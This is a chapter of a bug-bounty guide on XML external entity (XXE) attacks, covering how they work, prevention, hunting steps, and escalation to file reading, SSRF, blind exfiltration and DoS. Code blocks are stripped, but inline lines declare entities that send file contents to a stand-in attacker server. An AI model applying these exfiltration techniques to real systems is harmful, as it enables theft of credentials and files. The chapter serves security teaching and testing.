- en: '15'
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: XML External Entity
  prefs: []
  type: TYPE_NORMAL
- en: '![](image_fi/book_art/chapterart.png)'
  prefs: []
  type: TYPE_IMG
- en: '*XML external entity attacks (**XXEs)* are fascinating vulnerabilities that
    target the XML parsers of an application. XXEs can be very impactful bugs, as
    they can lead to confidential information disclosure, SSRFs, and DoS attacks.
    But they are also difficult to understand and exploit.'
  prefs: []
  type: TYPE_NORMAL
- en: In this chapter, we’ll dive into the ins and outs of XXEs so you can find one
    in the wild. We will also talk about how to use XXEs to extract sensitive files
    on the target system, launch SSRFs, and trigger DoS attacks.
  prefs: []
  type: TYPE_NORMAL
- en: Mechanisms
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: '*Extensible Markup Language (**XML)* is designed for storing and transporting
    data. This markup language allows developers to define and represent arbitrary
    data structures in a text format using a tree-like structure like that of HTML.
    For example, web applications commonly use XML to transport identity information
    in Security Assertion Markup Language (SAML) authentication. The XML might look
    like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE0]'
  prefs: []
  type: TYPE_PRE
- en: Notice here that unlike HTML, XML has user-defined tag names that let you structure
    the XML document freely. The XML format is widely used in various functionalities
    of web applications, including authentication, file transfers, and image uploads,
    or simply to transfer HTTP data from the client to the server and back.
  prefs: []
  type: TYPE_NORMAL
- en: 'XML documents can contain a *document type definition (**DTD)*, which defines
    the structure of an XML document and the data it contains. These DTDs can be loaded
    from external sources or declared in the document itself within a `DOCTYPE` tag.
    For example, here is a DTD that defines an XML entity called `file`:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE1]'
  prefs: []
  type: TYPE_PRE
- en: 'XML entities work like variables in programming languages: any time you reference
    this entity by using the syntax `&file`, the XML document will load the value
    of `file` in its place. In this case, any reference of `&file` within the XML
    document will be replaced by `"Hello!"`.'
  prefs: []
  type: TYPE_NORMAL
- en: 'XML documents can also use *external entities* to access either local or remote
    content with a URL. If an entity’s value is preceded by a `SYSTEM` keyword, the
    entity is an external entity, and its value will be loaded from the URL. You can
    see here that the following DTD declares an external entity named `file`, and
    the value of `file` is the contents of *file:///example.txt* on the local filesystem:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE2]'
  prefs: []
  type: TYPE_PRE
- en: That last line loads the `file` entity in the XML document, referencing the
    contents of the text file located at *file:///example.txt*.
  prefs: []
  type: TYPE_NORMAL
- en: 'External entities can also load resources from the internet. This DTD declares
    an external entity named `file` that points to the home page of *example.com*:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE3]'
  prefs: []
  type: TYPE_PRE
- en: What’s the vulnerability hidden within this functionality? The issue is that
    if users can control the values of XML entities or external entities, they might
    be able to disclose internal files, port-scan internal machines, or launch DoS
    attacks.
  prefs: []
  type: TYPE_NORMAL
- en: Many sites use older or poorly configured XML parsers to read XML documents.
    If the parser allows user-defined DTDs or user input within the DTD and is configured
    to parse and evaluate the DTD, attackers can declare their own external entities
    to achieve malicious results.
  prefs: []
  type: TYPE_NORMAL
- en: 'For example, let’s say a web application lets users upload their own XML document.
    The application will parse and display the document back to the user. A malicious
    user can upload a document like this one to read the */etc/shadow* file on the
    server, which is where Unix systems store usernames and their encrypted passwords:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE4]'
  prefs: []
  type: TYPE_PRE
- en: Parsing this XML file will cause the server to return the contents of */etc/shadow*
    because the XML file includes */etc/shadow* via an external entity 1.
  prefs: []
  type: TYPE_NORMAL
- en: Attacks like these are called XML external entity attacks, or *XXEs*. Applications
    are vulnerable to XXEs when the application accepts user-supplied XML input or
    passes user input into DTDs, which is then parsed by an XML parser, and that XML
    parser reads local system files or sends internal or outbound requests specified
    in the DTD.
  prefs: []
  type: TYPE_NORMAL
- en: Prevention
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: Preventing XXEs is all about limiting the capabilities of an XML parser. First,
    because DTD processing is a requirement for XXE attacks, you should disable DTD
    processing on the XML parsers if possible. If it’s not possible to disable DTDs
    completely, you can disable external entities, parameter entities (covered in
    “Escalating the Attack” on page 254), and inline DTDs (DTDs included in the XML
    document). And to prevent XXE-based DoS, you can limit the XML parser’s parse
    time and parse depth. You can also disable the expansion of entities entirely.
  prefs: []
  type: TYPE_NORMAL
- en: The mechanisms for disabling DTD processing and configuring parser behavior
    vary based on the XML parser in use. For example, if you’re using the default
    PHP XML parser, you need to set `libxml_disable_entity_loader` to `TRUE` to disable
    the use of external entities. For more information on how to do it for your parser,
    consult the OWASP Cheat Sheet at [https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md)*.*
  prefs: []
  type: TYPE_NORMAL
- en: Another path you can take is input validation. You could create an allowlist
    for user-supplied values that are passed into XML documents, or sanitize potentially
    hostile data within XML documents, headers, or nodes. Alternatively, you can use
    less complex data formats like JSON instead of XML whenever possible.
  prefs: []
  type: TYPE_NORMAL
- en: In classic XXEs (like the example I showed in “Mechanisms” on page 249), attackers
    exfiltrate data by making the application return data in an HTTP response. If
    the server takes XML input but does not return the XML document in an HTTP response,
    attackers can use blind XXEs to exfiltrate data instead. Blind XXEs steal data
    by having the target server make an outbound request to the attacker’s server
    with the stolen data. To prevent blind XXEs, you can disallow outbound network
    traffic.
  prefs: []
  type: TYPE_NORMAL
- en: Finally, you can routinely review your source code to detect and fix XXE vulnerabilities.
    And because many XXEs are introduced by an application’s dependencies instead
    of its custom source code, you should keep all dependencies in use by your application
    or by the underlying operating system up-to-date.
  prefs: []
  type: TYPE_NORMAL
- en: Hunting for XXEs
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: To find XXEs, start with locating the functionalities that are prone to them.
    This includes anywhere that the application receives direct XML input, or receives
    input that is inserted into XML documents that the application parses.
  prefs: []
  type: TYPE_NORMAL
- en: 'Step 1: Find XML Data Entry Points'
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'Many applications use XML data to transfer information within HTTP messages.
    To look for these endpoints, you can open up your proxy and browse the target
    application. Then, find XML-like documents in HTTP messages by looking for the
    previously mentioned tree-like structures, or by looking for the signature of
    an XML document: the string `"<?xml"`.'
  prefs: []
  type: TYPE_NORMAL
- en: Keep an eye out for encoded XML data in the application as well. Sometimes applications
    use base64- or URL-encoded XML data for ease of transportation. You can find these
    XML entry points by decoding any blocks of data that look suspicious. For example,
    a base64-encoded block of XML code tends to start with `LD94bWw`, which is the
    base64-encoded string of `"<?xml"`.
  prefs: []
  type: TYPE_NORMAL
- en: Besides searching for XML within HTTP messages, you should also look for file-upload
    features. This is because XML forms the basis of many common file types. If you
    can upload one of these file types, you might be able to smuggle XML input to
    the application’s XML parser. XML can be written into document and image formats
    like XML, HTML, DOCX, PPTX, XLSX, GPX, PDF, SVG, and RSS feeds. Furthermore, metadata
    embedded within images like GIF, PNG, and JPEG files are all based on XML. SOAP
    web services are also XML based. We’ll talk more about SOAP in Chapter 24.
  prefs: []
  type: TYPE_NORMAL
- en: 'In addition to looking for locations where the application accepts XML data
    by default, you can try to force the application into parsing XML data. Sometimes
    endpoints take plaintext or JSON input by default but can process XML input as
    well. On endpoints that take other formats of input, you can modify the `Content-Type`
    header of your request to one of the following headers:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE5]'
  prefs: []
  type: TYPE_PRE
- en: Then, try to include XML data in your request body. Sometimes this is all it
    takes to make the target application parse your XML input.
  prefs: []
  type: TYPE_NORMAL
- en: Finally, some applications receive user-submitted data and embed it into an
    XML document on the server side. If you suspect that is happening, you can submit
    an XInclude test payload to the endpoint, which I introduce in step 5.
  prefs: []
  type: TYPE_NORMAL
- en: 'Step 2: Test for Classic XXE'
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Once you’ve determined that the endpoints can be used to submit XML data, you
    can start to test for the presence of functionalities needed for XXE attacks.
    This usually involves sending a few trial-and-error XXE payloads and observing
    the application’s response.
  prefs: []
  type: TYPE_NORMAL
- en: 'If the application is returning results from the parser, you might be able
    to carry out a classic XXE attack—that is, you can read the leaked files directly
    from the server’s response. To search for classic XXEs, first check whether XML
    entities are interpreted by inserting XML entities into the XML input and see
    if it loads properly:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE6]'
  prefs: []
  type: TYPE_PRE
- en: 'Then, test whether the `SYSTEM` keyword is usable by trying to load a local
    file:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE7]'
  prefs: []
  type: TYPE_PRE
- en: 'When the `SYSTEM` keyword does not work, you can replace it with the `PUBLIC`
    keyword instead. This tag requires you to supply an ID surrounded by quotes after
    the `PUBLIC` keyword. The parser uses this to generate an alternate URL for the
    value of the entity. For our purposes, you can just use a random string in its
    place:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE8]'
  prefs: []
  type: TYPE_PRE
- en: Next, try to extract some common system files. You can start with the files
    */etc/hostname* and */etc/passwd*, for example. Another file I like to extract
    using XXEs is *.bash_history*. This file is typically located at each user’s home
    directory (*~/.bash_history*) and contains a list of commands previously executed.
    By reading this file, you can often uncover juicy information like internal URLs,
    IP addresses, and file locations. Common system files or paths mentioned here
    can be restricted, so don’t give up if the first few files you try to read do
    not display.
  prefs: []
  type: TYPE_NORMAL
- en: 'Step 3: Test for Blind XXE'
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: If the server takes XML input but does not return the XML document in an HTTP
    response, you can test for a blind XXE instead. Instead of reading files from
    the server’s response, most blind XXE attacks steal data by having the target
    server make a request to the attacker’s server with the exfiltrated information.
  prefs: []
  type: TYPE_NORMAL
- en: 'First, you need to make sure that the server can make outbound connections
    by having the target make a request to your server. You can set up a callback
    listener by following the instructions in Chapter 13. The process for setting
    up a listener to discover XXEs is the same as setting up to find SSRFs. Try making
    an external entity load a resource on your machine. To bypass common firewall
    restrictions, you should test with ports 80 and 443 first, because the target’s
    firewall might not allow outbound connections on other ports:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE9]'
  prefs: []
  type: TYPE_PRE
- en: You can then search the access logs of your server and look for a request to
    that particular file. In this case, you’ll be looking for a GET request for the
    *xxe_test.txt* file. Once you’ve confirmed that the server can make outbound requests,
    you can try to exfiltrate files by using the techniques covered in upcoming sections.
  prefs: []
  type: TYPE_NORMAL
- en: 'Step 4: Embed XXE Payloads in Different File Types'
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Besides testing for XXEs on HTTP request bodies, you can try to upload files
    containing XXE payloads to the server. File-upload endpoints and file parsers
    are often not protected by the same XXE protection mechanisms as regular endpoints.
    And hiding your XXE payloads in different file types means that you will be able
    to upload your payloads even if the application restricts the type of files that
    can be uploaded.
  prefs: []
  type: TYPE_NORMAL
- en: This section presents just a few examples of how to embed XXE payloads in various
    file types. You should be able to find more examples by searching the internet.
  prefs: []
  type: TYPE_NORMAL
- en: 'To embed an XXE payload in an SVG image, you need to first open up the image
    as a text file. Take this SVG image of a blue circle, for example:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE10]'
  prefs: []
  type: TYPE_PRE
- en: 'Insert the XXE payload by adding a DTD directly into the file and referencing
    the external entity in the SVG image. You can then save the file as an *.svg*
    file and upload it to the server:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE11]'
  prefs: []
  type: TYPE_PRE
- en: Microsoft Word documents (*.docx* files), PowerPoint presentations (*.pptx*),
    and Excel worksheets (*.xlxs*) are archive files containing XML files, so you
    can insert XXE payloads into them as well. To do so, you should first unzip the
    document file. For example, I used the Unarchiver software on a Mac to extract
    the files. You should see a few folders containing XML files ([Figure 15-1](#figure15-1)).
  prefs: []
  type: TYPE_NORMAL
- en: '![f15001](image_fi/501546c15/f15001.png)'
  prefs: []
  type: TYPE_IMG
- en: 'Figure 15-1: When you unarchive a DOCX file, you will see a few folders containing
    XML files.'
  prefs: []
  type: TYPE_NORMAL
- en: Then you can simply insert your payload into */word/document.xml*, */ppt/presentation.xml*,
    or */xl/workbook.xml*. Finally, repack the archives into the *.docx*, *.pptx*,
    or *.xlxs* format.
  prefs: []
  type: TYPE_NORMAL
- en: 'You can do this by `cd`ing into the unarchived folder and running the command
    `zip -r` `filename.format` `*`. The `zip` command line utility archives files.
    The `-r` option tells `zip` to recursively archive files in directories, `filename.format`
    tells zip what the name of the archived file should be, and `*` tells zip to archive
    all files in the current directory. In this case, you can run these commands to
    create a new DOCX file:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE12]'
  prefs: []
  type: TYPE_PRE
- en: You should see the repacked document appear in the current directory.
  prefs: []
  type: TYPE_NORMAL
- en: 'Step 5: Test for XInclude Attacks'
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: Sometimes you cannot control the entire XML document or edit the DTD of an XML
    document. But you can still exploit an XXE vulnerability if the target application
    takes your user input and inserts it into XML documents on the backend.
  prefs: []
  type: TYPE_NORMAL
- en: In this situation, you might be able to execute an XInclude attack instead.
    *XInclude* is a special XML feature that builds a separate XML document from a
    single XML tag named `xi:include`. If you can control even a single piece of unsanitized
    data passed into an XML document, you might be able to place an XInclude attack
    within that value.
  prefs: []
  type: TYPE_NORMAL
- en: 'To test for XInclude attacks, insert the following payload into the data entry
    point and see if the file that you requested gets sent back in the response body:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE13]'
  prefs: []
  type: TYPE_PRE
- en: This piece of XML code does two things. First, it references the *http://www.w3.org/2001/XInclude*
    namespace so that we can use the `xi:include` element. Next, it uses that element
    to parse and include the */etc/hostname* file in the XML document.
  prefs: []
  type: TYPE_NORMAL
- en: Escalating the Attack
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: What you can achieve with an XXE vulnerability depends on the permissions given
    to the XML parser. Generally, you can use XXEs to access and exfiltrate system
    files, source code, and directory listings on the local machine. You can also
    use XXEs to perform SSRF attacks to port-scan the target’s network, read files
    on the network, and access resources that are hidden behind a firewall. Finally,
    attackers sometimes use XXEs to launch DoS attacks.
  prefs: []
  type: TYPE_NORMAL
- en: Reading Files
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'To read local files by using an XXE vulnerability, place the local file’s path
    into the DTD of the parsed XML file. Local files can be accessed by using the
    *file://* URL scheme followed by the file’s path on the machine. This payload
    will make the XML parser return the contents of the */etc/shadow* file on the
    server:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE14]'
  prefs: []
  type: TYPE_PRE
- en: Launching an SSRF
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'Besides retrieving system files, you can use the XXE vulnerability to launch
    SSRF attacks against the local network. For example, you can launch a port scan
    by switching out the external entity’s URL with different ports on the target
    machine. This is similar to the port-scanning technique mentioned in Chapter 13,
    where you can determine the status of a port by analyzing differences in the server’s
    responses:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE15]'
  prefs: []
  type: TYPE_PRE
- en: 'You can also use an XXE to launch an SSRF to pull instance metadata, as we
    talked about in Chapter 13. This payload will make the parser return AWS metadata:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE16]'
  prefs: []
  type: TYPE_PRE
- en: When trying to view unintended data like this, you should look for the exfiltrated
    data by inspecting the page source code (right-click the page and click **View
    Source**) or HTTP response directly, rather than viewing the HTML page rendered
    by the browser, because the browser might not render the page correctly.
  prefs: []
  type: TYPE_NORMAL
- en: Of course, what you can do with an XXE-based SSRF isn’t simply limited to network
    scanning and retrieving instance metadata. You can also use the information you
    gathered to pivot into internal services. For more ideas of how to exploit SSRFs,
    visit Chapter 13.
  prefs: []
  type: TYPE_NORMAL
- en: Using Blind XXEs
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'Sometimes the application does not return the results of XML parsing to the
    user. In this case, you can still exfiltrate data to a server that you control
    by forcing the XML parser to make an external request with the desired data in
    the request URL—the blind XXE attacks mentioned earlier. Then you can monitor
    your server logs to retrieve the exfiltrated data. At this point, you might think
    the payload of a blind XXE looks like this:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE17]'
  prefs: []
  type: TYPE_PRE
- en: This payload is meant to exfiltrate the */etc/shadow* file on the server by
    making a request to the attacker’s server with the file’s contents in a URL parameter.
    The payload first defines an external entity `file` that contains the contents
    of the local */etc/shadow* file. Then it makes a request to the attacker’s server
    with the contents of that file in the request’s URL parameter.
  prefs: []
  type: TYPE_NORMAL
- en: 'However, this attack probably wouldn’t work, because most parsers do not allow
    external entities to be included in other external entities. And parsers would
    stop processing the DTD once they encounter this line: `<!ENTITY exfiltrate SYSTEM
    "http://attacker_server/?&file">`. So exfiltrating data by using a blind XXE is
    a bit more complicated than in a classic XXE.'
  prefs: []
  type: TYPE_NORMAL
- en: 'Fortunately, XML DTDs have a feature called *parameter entities* that we can
    use instead. Parameter entities are XML entities that can be referenced only elsewhere
    within the DTD. They are declared and referenced with a percent (`%`) character.
    For example, the blind XXE payload I introduced earlier can be rewritten as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE18]'
  prefs: []
  type: TYPE_PRE
- en: This DTD first declares a parameter entity called `file` that contains the file
    contents of */etc/shadow* 1. Then it declares a parameter entity named `ent` that
    contains a dynamic declaration of another parameter entity called `exfiltrate`
    2. `&#x25;` is the hex-encoded version of the percent sign (`%`). Depending on
    your target, hex encoding is sometimes needed for special characters within dynamic
    declarations. The `exfiltrate` entity points to the attacker’s server with the
    contents of */etc/shadow* in the URL parameter. Finally, the DTD references `ent`
    to declare the `exfiltrate` entity and then references `exfiltrate` to trigger
    the outbound request.
  prefs: []
  type: TYPE_NORMAL
- en: 'But if you try to upload this payload to a target, you might notice that it
    does not work. This is because, according to XML specifications, parameter entities
    are treated differently in inline DTDs (DTDs within the XML document specified
    within the `DOCTYPE` tag) and external DTDs (a separate DTD hosted elsewhere).
    Within inline DTDs, parameter entities cannot be referenced within markups, so
    this line wouldn’t work: `<!ENTITY &#x25; exfiltrate SYSTEM ''http://attacker_server/?%file;''>`,
    whereas in external DTDs, no such restriction exists.'
  prefs: []
  type: TYPE_NORMAL
- en: 'To exfiltrate data via a blind XXE, you have to overcome this restriction by
    hosting an external DTD on your server. Try hosting a file named *xxe.dtd* on
    your server:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE19]'
  prefs: []
  type: TYPE_PRE
- en: 'Then make the target parser interpret your DTD by specifying it within a parameter
    entity and referencing that entity:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE20]'
  prefs: []
  type: TYPE_PRE
- en: This way, the target server will parse the submitted XML file and notice that
    a parameter entity is referencing an external file. Then the target server will
    retrieve and parse that external DTD, so your payload will execute, and the target
    will send the exfiltrated data back to your server. Here, we are exfiltrating
    the contents of the file */etc/shadow* as a URL parameter in a request to the
    attacker’s server.
  prefs: []
  type: TYPE_NORMAL
- en: Notice that in this attack, we used only parameter entities and did not use
    external entities at all! If the parser blocks external entities or limits the
    referencing of entities to protect against XXE, you can use this technique as
    well. However, this strategy can exfiltrate only a single line of the target file,
    because the newline character (`\n`) within target files will interrupt the outbound
    URL and may even cause the HTTP request to fail.
  prefs: []
  type: TYPE_NORMAL
- en: 'An easier way to exfiltrate data via a blind XXE is by forcing the parser to
    return a descriptive error message. For example, you can induce a File Not Found
    error by referencing a nonexistent file as the value of an external entity. Your
    external DTD can be rewritten as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE21]'
  prefs: []
  type: TYPE_PRE
- en: 'Notice that I included the contents of */etc/shadow* in the URL parameter of
    the nonexistent filepath. Then you can submit the same payload to the target to
    trigger the attack:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE22]'
  prefs: []
  type: TYPE_PRE
- en: 'This malicious DTD will cause the parser to deliver the desired file contents
    as a File Not Found error:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE23]'
  prefs: []
  type: TYPE_PRE
- en: Performing Denial-of-Service Attacks
  prefs:
  - PREF_H3
  type: TYPE_NORMAL
- en: 'Another potential way that attackers can exploit XML vulnerabilities is to
    launch denial-of-service attacks, which disrupt the machine so that legitimate
    users cannot access its services. Note that you should never try this on a live
    target! Testing for DoS on a live target can cause the organization financial
    loss and is usually against companies’ bug bounty policies:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE24]'
  prefs: []
  type: TYPE_PRE
- en: This payload embeds entities within entities, causing the XML parser to recursively
    dereference entities to get to the root entity value `lol`. Each `lol9` entity
    would be expanded into 10 `lol8` values, and each of those would become 10 `lol7`s,
    and so on. Eventually, a single `lol9` will be expanded into one billion `lol`s.
    This will overload the memory of the XML parser, potentially causing it to crash.
  prefs: []
  type: TYPE_NORMAL
- en: 'This attack method is also called a *billion laughs attack* or an *XML bomb*.
    The example here is taken from Wikipedia, where you can read more about the attack:
    [https://en.wikipedia.org/wiki/Billion_laughs_attack](https://en.wikipedia.org/wiki/Billion_laughs_attack).
    Interestingly, although this attack is often classified as an XXE attack, it does
    not involve the use of any external entities!'
  prefs: []
  type: TYPE_NORMAL
- en: More About Data Exfiltration Using XXEs
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: XXE data exfiltration becomes more complicated if the parser is hardened against
    XXE attacks, and if you are trying to read files of specific formats. But there
    are always more ways to bypass restrictions!
  prefs: []
  type: TYPE_NORMAL
- en: 'Sometimes you’ll want to exfiltrate files that contain XML special characters,
    such as angle brackets (`<>`), quotes (`"` or `''`), and the ampersand (`&`).
    Accessing these files directly via an XXE would break the syntax of your DTD and
    interfere with the exfiltration. Thankfully, XML already has a feature that deals
    with this issue. In an XML file, characters wrapped within `CDATA` (character
    data) tags are not seen as special characters. So, for instance, if you’re exfiltrating
    an XML file, you can rewrite your malicious external DTD as follows:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE25]'
  prefs: []
  type: TYPE_PRE
- en: 'This DTD first declares a parameter entity that points to the file you want
    to read 1. It also declares two parameter entities containing the strings `"<![CDATA["`
    and `"]]>"`2 3. Then it constructs an exfiltration URL that will not break the
    DTD’s syntax by wrapping the file’s contents in a `CDATA` tag 4. The concatenated
    `exfiltrate` entity declaration will become the following:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE26]'
  prefs: []
  type: TYPE_PRE
- en: You can see that our payloads are quickly getting complicated. To prevent accidentally
    introducing syntax errors to the payload, you can use a tool such as XmlLint ([https://xmllint.com/](https://xmllint.com/))
    to ensure that your XML syntax is valid.
  prefs: []
  type: TYPE_NORMAL
- en: 'Finally, send your usual XML payload to the target to execute the attack:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE27]'
  prefs: []
  type: TYPE_PRE
- en: 'Another way of exfiltrating files with special characters is to use a PHP URL
    wrapper. If the target is a PHP-based app, PHP wrappers let you convert the desired
    data into base64 format so you can use it to read XML files or even binary files:'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE28]'
  prefs: []
  type: TYPE_PRE
- en: 'The File Transfer Protocol (FTP) can also be used to send data directly while
    bypassing special character restrictions. HTTP has many special character restrictions
    and typically restricts the length of the URL. Using FTP instead is an easy way
    to bypass that. To use it, you need to run a simple FTP server on your machine
    and modify your malicious DTD accordingly. I used the simple Ruby server script
    at [https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb](https://github.com/ONsec-Lab/scripts/blob/master/xxe-ftp-server.rb):'
  prefs: []
  type: TYPE_NORMAL
- en: '[PRE29]'
  prefs: []
  type: TYPE_PRE
- en: We are using port 2121 here because the Ruby FTP server we are using runs on
    port 2121, but the correct port to use depends on how you run your server 1.
  prefs: []
  type: TYPE_NORMAL
- en: Finding Your First XXE!
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'Now that you understand the basics of the XXE attack, try to find your own
    XXE vulnerability on a real target. Follow the steps covered in this chapter to
    maximize your chances of success:'
  prefs: []
  type: TYPE_NORMAL
- en: Find data entry points that you can use to submit XML data.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Determine whether the entry point is a candidate for a classic or blind XXE.
    The endpoint might be vulnerable to classic XXE if it returns the parsed XML data
    in the HTTP response. If the endpoint does not return results, it might still
    be vulnerable to blind XXE, and you should set up a callback listener for your
    tests.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Try out a few test payloads to see if the parser is improperly configured. In
    the case of classic XXEs, you can check whether the parser is processing external
    entities. In the case of blind XXEs, you can make the server send requests to
    your callback listener to see if you can trigger outbound interaction.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: If the XML parser has the functionalities that make it vulnerable to XXE attacks,
    try to exfiltrate a common system file, like */etc/hostname*.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: You can also try to retrieve some more sensitive system files, like */etc/shadow*
    or *~/.bash_history*.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: If you cannot exfiltrate the entire file with a simple XXE payload, try to use
    an alternative data exfiltration method.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: See if you can launch an SSRF attack using the XXE.
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Draft up your very first XXE report and send it over to the company!
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
